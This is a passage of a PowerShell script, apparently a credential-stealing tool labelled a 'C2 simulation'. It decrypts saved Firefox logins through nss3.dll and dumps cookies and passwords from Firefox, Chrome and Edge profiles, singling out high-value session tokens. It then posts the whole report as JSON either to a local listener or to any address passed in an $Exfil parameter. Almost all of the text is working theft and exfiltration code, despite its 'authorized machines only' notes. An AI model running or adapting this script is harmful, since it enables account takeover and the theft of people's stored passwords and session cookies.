    return [NssBridge]
}

function Find-NssLibrary {
    # prepend common Firefox install dirs to PATH so nss3.dll is findable
    $dirs = @(
        "C:\Program Files\Mozilla Firefox",
        "C:\Program Files (x86)\Mozilla Firefox",
        "C:\Program Files\Firefox Developer Edition",
        "C:\Program Files (x86)\Firefox Developer Edition",
        "C:\Program Files\Mozilla Thunderbird",
        "C:\Program Files (x86)\Mozilla Thunderbird",
        [IO.Path]::Combine([Environment]::GetFolderPath("LocalApplicationData"), "Mozilla Firefox")
    )
    foreach ($d in $dirs) {
        if (Test-Path $d) {
            $dll = Join-Path $d "nss3.dll"
            if (Test-Path $dll) {
                $env:PATH = "$d;" + $env:PATH
                return $dll
            }
        }
    }
    return $null
}

function Dump-Logins {
    param([string]$ProfilePath, [bool]$PlainOut)
    $jsonPath = Join-Path $ProfilePath "logins.json"
    if (-not (Test-Path $jsonPath)) {
        $jsonPath = Join-Path $ProfilePath "logins-backup.json"
        if (-not (Test-Path $jsonPath)) { return @() }
    }
    $data = Get-Content $jsonPath -Raw | ConvertFrom-Json
    $bridge = Get-NssBridge
    $foundNss = $false
    if ($NssPath) {
        $env:PATH = (Split-Path $NssPath) + ";" + $env:PATH
        $foundNss = $true
    }
    else {
        $foundNss = (Find-NssLibrary) -ne $null
    }
    if (-not $foundNss) {
        Write-Host "  [warn] Could not locate nss3.dll - skipping saved logins (cookies already dumped)"
        return @()
    }
    if (-not $bridge::Init("sql:" + $ProfilePath)) {
        Write-Host "  [warn] NSS_Init failed - skipping saved logins"
        return @()
    }
    $logins = @()
    try {
        if ($bridge::NeedLogin()) {
            if (-not $Password -or -not $bridge::Unlock($Password)) {
                return @()
            }
        }
        foreach ($entry in $data.logins) {
            $user = ""
            $pass = ""
            $encType = [int]$entry.encType
            if ($encType -ne 0) {
                try {
                    $user = $bridge::Decrypt([string]$entry.encryptedUsername)
                    $pass = $bridge::Decrypt([string]$entry.encryptedPassword)
                }
                catch {
                    $user = "*** decryption failed ***"
                    $pass = "*** decryption failed ***"
                }
            }
            else {
                $user = [string]$entry.encryptedUsername
                $pass = [string]$entry.encryptedPassword
            }
            $logins += [pscustomobject]@{
                hostname   = [string]$entry.hostname
                username   = $user
                password   = $pass
                httpRealm  = [string]$entry.httpRealm
                formSubmitURL = [string]$entry.formSubmitURL
                guid       = [string]$entry.guid
            }
        }
    }
    finally {
        $bridge::Shutdown()
    }
    return ,$logins
}

$listenerScript = {
    param($LPort)
    $lst = New-Object System.Net.Sockets.TcpListener([Net.IPAddress]::Loopback, $LPort)
    $lst.Start()
    Write-Output "__READY__"
    try {
        $cli = $lst.AcceptTcpClient()
        $stream = $cli.GetStream()
        $raw = New-Object System.Collections.Generic.List[byte]
        $crlf = [byte[]]@(13, 10, 13, 10)
        $b = New-Object byte[] 4096
        $headerEnd = -1

        while ($true) {
            $n = $stream.Read($b, 0, $b.Length)
            if ($n -le 0) { break }
            for ($i = 0; $i -lt $n; $i++) { $raw.Add($b[$i]) }
            $cnt = $raw.Count
            if ($cnt -ge 4) {
                for ($i = 0; $i -le ($cnt - 4); $i++) {
                    if ($raw[$i] -eq $crlf[0] -and $raw[$i + 1] -eq $crlf[1] -and
                        $raw[$i + 2] -eq $crlf[2] -and $raw[$i + 3] -eq $crlf[3]) {
                        $headerEnd = $i + 4
                        break
                    }
                }
                if ($headerEnd -ge 0) { break }
            }
        }

        if ($headerEnd -lt 0) {
            Write-Output "__NO_REQ__"
            $cli.Close()
            return
        }

        $headerText = [Text.Encoding]::ASCII.GetString($raw.GetRange(0, $headerEnd).ToArray())
        $requestLine = ($headerText -split "`r`n")[0]
        $contentLen = 0
        foreach ($hl in ($headerText -split "`r`n")) {
            if ($hl -match '^Content-Length:\s*(\d+)\s*$') { $contentLen = [int]$Matches[1] }
        }

        $bodyList = New-Object System.Collections.Generic.List[byte]
        for ($i = $headerEnd; $i -lt $raw.Count; $i++) { $bodyList.Add($raw[$i]) }
        while ($bodyList.Count -lt $contentLen) {
            $n = $stream.Read($b, 0, $b.Length)
            if ($n -le 0) { break }
            for ($i = 0; $i -lt $n; $i++) { $bodyList.Add($b[$i]) }
        }
        $take = [Math]::Min($bodyList.Count, $contentLen)
        $bodyText = ""
        if ($take -gt 0) {
            $bodyText = [Text.Encoding]::UTF8.GetString($bodyList.GetRange(0, $take).ToArray())
        }

        Write-Output ("__CALLBACK__ " + $requestLine)
        if ($bodyText) { Write-Output $bodyText }

        $resp = "HTTP/1.1 200 OK`r`nContent-Length: 2`r`nConnection: close`r`n`r`nok"
        $rb = [Text.Encoding]::ASCII.GetBytes($resp)
        $stream.Write($rb, 0, $rb.Length)
        $stream.Flush()
        $cli.Close()
    }
    finally {
        $lst.Stop()
    }
}

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
Write-Host "[*] Reading disk copies only - no login, no browser, no external network."

$useLocal = $NoExfil
$postUri = $Exfil
$job = $null
$ready = $false

if ($useLocal) {
    Write-Host ("[*] Starting local C2 receiver on http://127.0.0.1:{0}/ ..." -f $Port)
    $job = Start-Job -ScriptBlock $listenerScript -ArgumentList $Port
    for ($i = 0; $i -lt 50; $i++) {
        Start-Sleep -Milliseconds 100
        $probe = Receive-Job $job -Keep
        if ($probe -contains "__READY__") { $ready = $true; break }
    }
    if (-not $ready) {
        Write-Host "[!] Could not start local receiver." -ForegroundColor Red
    }
    else {
        $postUri = "http://127.0.0.1:{0}/c2" -f $Port
    }
}
else {
    Write-Host ("[*] Exfil mode: full report will be posted to {0}" -f $Exfil)
}

try {
    if (-not $useLocal -or $ready) {
        if ($Profile) {
            $found = @([pscustomobject]@{ Name = (Split-Path $Profile -Leaf); Path = $Profile })
        }
        else {
            $found = @(Get-FirefoxProfiles (Get-FirefoxRoot))
        }

        if ($found.Count -eq 0) {
            Write-Host "[!] No Firefox profiles found." -ForegroundColor Red
        }
        else {
            Write-Host ("[*] Found {0} profile(s)." -f $found.Count)

            $reportProfiles = @()
            $totalHigh = 0

            foreach ($p in $found) {
                Write-Host ""
                Write-Host ("=== Profile: {0} ({1}) ===" -f $p.Name, $p.Path)

                $cookies = Dump-Cookies $p.Path
                $high = @($cookies | Where-Object { $_.high_value })
                Write-Host ("  Cookies: {0} total, {1} high-value session tokens" -f $cookies.Count, $high.Count)

                if ($high.Count -gt 0) {
                    Write-Host "`n  High-value session cookies:"
                    foreach ($c in ($high | Sort-Object host)) {
                        $v = if ($Plain) { $c.value } else { Format-Mask $c.value }
                        $flags = $(if ($c.isSecure) {"S"} else {"-"}) + $(if ($c.isHttpOnly) {"H"} else {"-"})
                        Write-Host ("  {0,-40} {1,-30} {2,-30} {3} {4,-10} [{5}]" -f $c.host, $c.name, $v, $flags, (Get-ExpiryHint $c.expiry), $c.category)
                    }
                    Write-Host "`n  All cookies:"
                }
                else {
                    Write-Host "`n  All cookies:"
                }
                foreach ($c in ($cookies | Sort-Object host)) {
                    $v = if ($Plain) { $c.value } else { Format-Mask $c.value }
                    $flags = $(if ($c.isSecure) {"S"} else {"-"}) + $(if ($c.isHttpOnly) {"H"} else {"-"})
                    Write-Host ("  {0,-40} {1,-30} {2,-30} {3} {4,-10}" -f $c.host, $c.name, $v, $flags, (Get-ExpiryHint $c.expiry))
                }

                $logins = @()
                try { $logins = Dump-Logins $p.Path $Plain }
                catch { Write-Host ("  [warn] Logins skipped: {0}" -f $_.Exception.Message) }
                if ($logins.Count -gt 0) {
                    Write-Host ("`n  Saved logins: {0}" -f $logins.Count)
                    foreach ($l in $logins) {
                        $u = if ($Plain) { $l.username } else { Format-MaskShort $l.username }
                        $pw = if ($Plain) { $l.password } else { Format-MaskShort $l.password }
                        Write-Host ("  {0,-55} user={1,-25} pass={2}" -f $l.hostname, $u, $pw)
                    }
                }
                else {
                    Write-Host "`n  Saved logins: none"
                }

                $totalHigh += $high.Count
                $reportProfiles += [pscustomobject]@{
                    name             = $p.Name
                    path             = $p.Path
                    cookie_count     = $cookies.Count
                    high_value_count = $high.Count
                    cookies          = $cookies
                    logins           = $logins
                }
            }

            $browserReport = @()
            foreach ($browser in @("chrome", "edge")) {
                $root = Get-WebkitRoot $browser
                $webkitProfiles = @(Get-WebkitProfiles $root $browser)
                if ($webkitProfiles.Count -eq 0) { continue }

                $key = $null
                try {
                    $key = Get-WebkitAesKey $root
                }
                catch {
                    Write-Host ("[warn] {0} skipped (no usable AES key): {1}" -f $browser, $_.Exception.Message) -ForegroundColor Yellow
                    continue
                }

                Write-Host ("[*] {0}: {1} profile(s) found." -f $browser, $webkitProfiles.Count)
                foreach ($p in $webkitProfiles) {
                    Write-Host ""
                    Write-Host ("=== {0} profile: {1} ({2}) ===" -f $p.browser, $p.name, $p.path)

                    $cookies = @()
                    try { $cookies = @(Dump-ChromiumCookies $p.path $key) }
                    catch { Write-Host ("  [warn] Cookies skipped: {0}" -f $_.Exception.Message) -ForegroundColor Yellow }
                    $high = @($cookies | Where-Object { $_.high_value })
                    Write-Host ("  Cookies: {0} total, {1} high-value session tokens" -f $cookies.Count, $high.Count)

                    if ($high.Count -gt 0) {
                        Write-Host "`n  High-value session cookies:"
                        foreach ($c in ($high | Sort-Object host)) {
                            $v = if ($Plain) { $c.value } else { Format-Mask $c.value }
                            $flags = $(if ($c.isSecure) {"S"} else {"-"}) + $(if ($c.isHttpOnly) {"H"} else {"-"})
                            Write-Host ("  {0,-40} {1,-30} {2,-30} {3} {4,-10} [{5}]" -f $c.host, $c.name, $v, $flags, (Get-ExpiryHint $c.expiry), $c.category)
                        }
                        Write-Host "`n  All cookies:"
                    }
                    else {
                        Write-Host "`n  All cookies:"
                    }
                    foreach ($c in ($cookies | Sort-Object host)) {
                        $v = if ($Plain) { $c.value } else { Format-Mask $c.value }
                        $flags = $(if ($c.isSecure) {"S"} else {"-"}) + $(if ($c.isHttpOnly) {"H"} else {"-"})
                        Write-Host ("  {0,-40} {1,-30} {2,-30} {3} {4,-10}" -f $c.host, $c.name, $v, $flags, (Get-ExpiryHint $c.expiry))
                    }

                    $logins = @()
                    try { $logins = @(Dump-ChromiumLogins $p.path $key) }
                    catch { Write-Host ("  [warn] Logins skipped: {0}" -f $_.Exception.Message) }
                    if ($logins.Count -gt 0) {
                        Write-Host ("`n  Saved logins: {0}" -f $logins.Count)
                        foreach ($l in $logins) {
                            $u = if ($Plain) { $l.username } else { Format-MaskShort $l.username }
                            $pw = if ($Plain) { $l.password } else { Format-MaskShort $l.password }
                            Write-Host ("  {0,-55} user={1,-25} pass={2}" -f $l.hostname, $u, $pw)
                        }
                    }
                    else {
                        Write-Host "`n  Saved logins: none"
                    }

                    $browserReport += [pscustomobject]@{
                        browser          = $p.browser
                        name             = $p.name
                        path             = $p.path
                        cookie_count     = $cookies.Count
                        high_value_count = $high.Count
                        cookies          = $cookies
                        logins           = $logins
                    }
                }
            }

            Write-Host ""
            Write-Host ("[*] {0} high-value session token(s) harvested across {1} profile(s)." -f $totalHigh, $reportProfiles.Count)

            if ($useLocal) {
                $reportNote = "Authorized machines only. Localhost C2 simulation - the report never leaves this machine."
            }
            else {
                $reportNote = "Authorized machines only. Localhost-forwarded C2 exfil - report delivered to the same-host Kali receiver."
            }
            $report = @{
                tool         = "c2_sim"
                generated_at = (Get-Date).ToString("s")
                note         = $reportNote
                profiles     = $reportProfiles
                browsers     = $browserReport
            } | ConvertTo-Json -Depth 12

            Write-Host ("[*] Posting full report to {0} ..." -f $postUri)
            try {
                $resp = Invoke-WebRequest -Method Post -Uri $postUri -Body $report -ContentType "application/json" -UseBasicParsing
                Write-Host ("[*] Report posted to {0} (HTTP {1})" -f $postUri, $resp.StatusCode)
            }
            catch {
                Write-Host ("[!] Report post failed: {0}" -f $_.Exception.Message) -ForegroundColor Yellow
            }
        }
    }
    elseif ($useLocal) {
        Write-Host "[!] Skipping harvest - local receiver unavailable." -ForegroundColor Red
    }

    if ($useLocal) {
        Write-Host ""
        $done = $job | Wait-Job -Timeout 10
        Start-Sleep -Milliseconds 500
        $all = Receive-Job $job

        Write-Host "======================================================"
        Write-Host " Simulated C2 callback received on localhost"
        Write-Host "======================================================"
        $sawCallback = $false
        foreach ($o in $all) {
            if ($o -eq "__READY__") { continue }
            if ($o -is [string] -and $o.StartsWith("__NO_REQ__")) {
                Write-Host "[!] No request reached the local receiver." -ForegroundColor Yellow
                continue
            }
            if ($o -is [string] -and $o.StartsWith("__CALLBACK__")) {
                Write-Host ("[+] " + $o.Substring(12))
                $sawCallback = $true
                continue
            }
            Write-Host $o
        }
        if (-not $sawCallback) {
            Write-Host "[!] No callback captured." -ForegroundColor Yellow
        }
        Write-Host "======================================================"
        Write-Host "[*] This callback stayed on this machine. Nothing was sent to the internet."
    }
}
finally {
    if ($useLocal) {
        Stop-Job $job -ErrorAction SilentlyContinue
        Remove-Job $job -Force -ErrorAction SilentlyContinue
    }
}
